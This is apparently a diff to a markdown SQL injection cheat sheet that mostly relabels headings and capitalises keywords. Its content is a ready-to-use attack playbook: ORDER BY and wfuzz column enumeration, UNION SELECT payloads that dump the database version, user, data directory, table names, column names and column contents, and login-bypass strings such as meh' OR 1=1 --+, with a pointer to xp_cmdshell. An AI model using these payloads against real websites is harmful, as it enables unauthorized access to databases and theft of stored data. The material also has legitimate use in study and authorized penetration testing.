@@ -30,57 +30,57 @@ like "<string>%"                                             # checks if provide
 ```
 Now comes the fun part, here's combination of error, union, blind SQL command injection examples.
 
-Determine back-end query number of columns
+Determine back-end query number of columns with error-based string SQL command injection
 ```php
 http://meh.com/index.php?id=1 order by <number>
 ```
 
-Determine back-end query number of columns by observing `http response size` with `wfuzz` 
+Determine back-end query number of columns by observing `http response size` with `wfuzz` in error-based integer SQL command injection
 ```php
 wfuzz -c -z range,1-10 "http://meh.com/index.php?id=1 order by FUZZ"
 ```
 
-Identify webpage printable union columns by providing false value to back-end query. This injection depends on number of columns identified by `order by` clause
+Identify webpage printable union columns by providing false value to back-end query with error-based integer SQL command injection. This injection depends on number of columns identified by `order by` clause
 ```php
 http://meh.com/index.php?id=-1 union select <number of columns seperated by comma>
 ```
 
-Print back-end SQL version, assuming column 3 content gets diplayed on webpage
+Print back-end SQL version with error-based integer SQL command injection, assuming column 3 content gets diplayed on webpage
 ```php
 http://meh.com/index.php?id=-1 union select 1,2,@@version,4,...
 ```
 
-Print user running the query to access back-end database server
+Print user running the query to access back-end database server with error-based integer SQL command injection
 ```php
 http://meh.com/index.php?id=-1 union select 1,2,user(),4,...
 ```
 
-Print database name
+Print database name with error-based integer SQL command injection
 ```php
 http://meh.com/index.php?id=-1 union select 1,2,database(),4,...
 ```
 
-Print database directory
+Print database directory with error-based integer SQL command injection
 ```php
 http://meh.com/index.php?id=-1 union select 1,2,@@datadir,4,...
 ```
 
-Print table names
+Print table names with error-based integer SQL command injection
 ```php
 http://meh.com/index.php?id=-1 union select 1,2,group_concat(table_name),4,... from information_schema.tables where table_schema=database()
 ```
 
-Print column names
+Print column names with error-based integer SQL command injection
 ```php
 http://meh.com/index.php?id=-1 union select 1,2,group_concat(column_name),4,... from information_schema.columns where table_name='<table name>'
 ```
 
-Print content of column
+Print content of column with error-based integer SQL command injection 
 ```php
 http://meh.com/index.php?id=-1 union select 1,2,group_concat(<column name>),4,... from <table name>
 ```
 
-Use `and` statement as substitute to reqular comments such as `--+`, `#`, and `/* */` in string (error-based) SQL injection
+Use `and` statement as substitute to reqular comments such as `--+`, `#`, and `/* */` with error-based string SQL command injection
 ```php
 http://meh.com/index.php?id=1' <sqli here> and '1
 ```
@@ -141,8 +141,8 @@ Hope those were helpfull! Now here's couple login bypass commands that worked fo
 ```php
 meh' OR 3=3;#
 meh' OR 2=2 LIMIT 1;#
-meh' or 'a'='a
-meh' or 1=1 --+
+meh' OR 'a'='a
+meh' OR 1=1 --+
 ```
 Sometimes you'll find SQL server that have `xp_cmdshell` turned on
 ```php
